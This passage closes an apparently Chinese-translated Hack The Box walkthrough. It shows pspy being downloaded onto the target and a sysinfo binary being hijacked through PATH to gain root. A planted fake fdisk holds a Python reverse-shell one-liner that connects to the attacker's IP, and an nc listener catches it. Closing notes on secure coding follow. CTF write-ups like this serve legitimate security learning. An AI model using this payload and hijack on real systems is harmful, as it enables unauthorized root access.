href="https://github.com/DominicBreuker/pspy" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">多米尼克·布鲁克/pspy</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">pspy是一个命令行工具，旨在无需root权限即可窥探进程。它可以让你看到…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">github.com</p></div></div><div class="nq l"><div class="pg l ns nt nu nq nv js nh"/></div></div></a></div><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="1eae" class="li lj iq mm b gy mv mw l mx my">$ python -m SimpleHTTPServer 6970</span></pre><ul class=""><li id="a7fb" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated">攻击机器</li></ul><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="354a" class="li lj iq mm b gy mv mw l mx my">$ wget 10.10.14.25:6970/pspy64</span></pre><ul class=""><li id="f96b" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated">远程机器</li></ul><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="ddee" class="li lj iq mm b gy mv mw l mx my">$ chmod +x pspy64</span><span id="8a5f" class="li lj iq mm b gy ph mw l mx my">$ ./pspy64</span></pre><p id="2a12" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在对机器进行了相当长一段时间的监视后，很少有人引起root的反应。其中两项如下:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi pi"><img src="../Images/95a4a4df1a941419773ea3374bff0171.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fU4Afd2urw0IEAOAe4er0w.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">每当有人通过ssh连接到机器时，就会发生这种情况</figcaption></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/5eeb27aa4257fb4f7bdeccab74c58ad8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1046/format:webp/1*_n1Zk7JQI8SLoLC09hkCRw.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">使用我们前面的linpeas.sh结果中列出的一个有趣的二进制文件:/bin/sysinfo，会出现以下序列</figcaption></figure><p id="9bff" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我们可以在上面的图片中看到，根操作显示为标识符UID=0。如果你正在使用pspy64，这是你最有可能会寻找的东西。</p><h2 id="d231" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">劫持Sysinfo二进制文件并获取根外壳</h2><p id="39e6" class="pw-post-body-paragraph kc kd iq kf b kg me ki kj kk mf km kn lr mg kq kr lv mh ku kv lz mi ky kz la ij bi translated">我试图劫持被调用的<code class="fe mj mk ml mm b">run-parts</code>二进制文件，但是，似乎环境变量总是被忽略，新的变量被硬编码到命令中。这样做是为了精确地防止hijacking⁴.</p><p id="168d" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">然而，对于<code class="fe mj mk ml mm b">sysinfo</code>序列，没有环境变量被初始化，只有相对路径被调用。这意味着我们可以劫持二进制调用的任何命令。</p><p id="8a30" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">为了实现这一点，我们执行以下操作:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="7cf2" class="li lj iq mm b gy mv mw l mx my">$ export PATH=/tmp/mok:$PATH</span></pre><p id="f425" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">这是为现有的<code class="fe mj mk ml mm b">$PATH</code>变量添加一个新路径。$PATH变量包含系统搜索要执行的二进制文件的路径。如果您预先计划了自己的路径，系统将首先直接进入该路径查找要执行的二进制文件，然后遍历变量中列出的其他路径(如果该二进制文件不在前面的路径中)。</p><p id="bca5" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我以此为指导:</p><div class="ne nf gp gr ng nh"><a href="https://www.baeldung.com/linux/path-variable" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">在Linux上向Linux路径变量- Baeldung添加路径</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">在这个快速教程中，我们将关注如何向Unix PATH变量添加路径。路径变量是一个环境…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">www.baeldung.com</p></div></div><div class="nq l"><div class="pk l ns nt nu nq nv js nh"/></div></div></a></div><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="8a0d" class="li lj iq mm b gy mv mw l mx my">$ vi /tmp/mok/fdisk</span><span id="c470" class="li lj iq mm b gy ph mw l mx my">~ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></pre><p id="fa65" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">保存后，使用<code class="fe mj mk ml mm b">chmod</code>使其成为可执行文件。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="5f0f" class="li lj iq mm b gy mv mw l mx my">$ chmod +x /tmp/mok/fdisk</span></pre><p id="afea" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">将会发生的是，当sysinfo调用命令<code class="fe mj mk ml mm b">fdisk -l</code>时，它将直接进入<code class="fe mj mk ml mm b">/tmp/mok</code>并运行<code class="fe mj mk ml mm b">fdisk</code>。因为fdisk包含我们的反向shell有效负载，所以我们只需要设置一个监听器，然后执行sysinfo命令。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="d64a" class="li lj iq mm b gy mv mw l mx my">$ nc -nvlp 5678</span></pre><ul class=""><li id="b2e2" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated">攻击机器</li></ul><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="c7b0" class="li lj iq mm b gy mv mw l mx my">$ sysinfo</span></pre><ul class=""><li id="7d67" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated">远程机器</li></ul><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/45fb1aea3cf2f8596af198dcec42687b.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*wKXOp1P5oEjc8y7sajDoaA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">我们找到贝壳了！</figcaption></figure><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="a2de" class="li lj iq mm b gy mv mw l mx my">$ ifconfig | fgrep 10. | awk '{print $2}' &amp;&amp; whoami &amp;&amp; hostname</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pm"><img src="../Images/4ba68cb7b45f70e88f5ea1959aa5e9fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1022/format:webp/1*xq4hgYpUG4_mMRWBRhh9kg.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">我们终于扎根了！</figcaption></figure></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><h2 id="6315" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">其他讨论要点和要点</h2><ol class=""><li id="1188" class="og oh iq kf b kg me kk mf lr pn lv po lz pp la pq om on oo bi translated">输入净化是这台机器中反复出现的主题，我想强调它的重要性，因为现在许多开发人员并不真正关心安全的编码实践。不实现输入净化方法，甚至草率地实现输入净化方法，可能并最终会在未来导致大量的问题。预防是王道，在这台机器的SQLI部分实现一个简单的输入验证可以使立足点变得复杂得多。</li><li id="c9f8" class="og oh iq kf b kg op kk oq lr or lv os lz ot la pq om on oo bi translated">魔术字节—问题在于，大多数实现只是检查文件的前几个字节来“确认”其合法性，因此实际上可以只编写一个反向shell脚本，将允许的文件类型的魔术字节放在最开始，并使用双扩展名保存它，这样就可以利用漏洞了。除此之外，另一个很好的例子是我的队友SymR写的。你可以在这里阅读他的文章。</li><li id="c089" class="og oh iq kf b kg op kk oq lr or lv os lz ot la pq om on oo bi translated">密码重用有时可能非常低调。如果实施得当，它实际上可以作为您资产的纵深防御机制。这台机器的密码重复使用部分非常准确，在野外看到这种情况并不罕见。</li><li id="2fc7" class="og oh iq kf b kg op kk oq lr or lv os lz ot la pq om on oo bi translated">劫持是我最喜欢的特权提升方法之一。在这台机器上，我们能够劫持sysinfo二进制文件，因为当它调用其他二进制文件时，它使用它们的相对路径来调用它们。相对路径可能非常有用，但也非常容易破解。当使用相对路径时，确保已经部署了一组细致的控制措施，以防止它成为特权提升媒介。</li></ol><p id="3eb9" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">这台机器一般很简单。我真的很喜欢这个魔术，以及劫持的过程。这是我最喜欢的HTB盒子之一。</p><p id="95ed" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我的演练到此结束。感谢您的阅读！</p><blockquote class="pr"><p id="c45e" class="ps pt iq bd pu pv pw px py pz qa la dk translated">作为10月PentesterLab赠品的一部分提交。</p></blockquote></div></div>    
</body>
</html>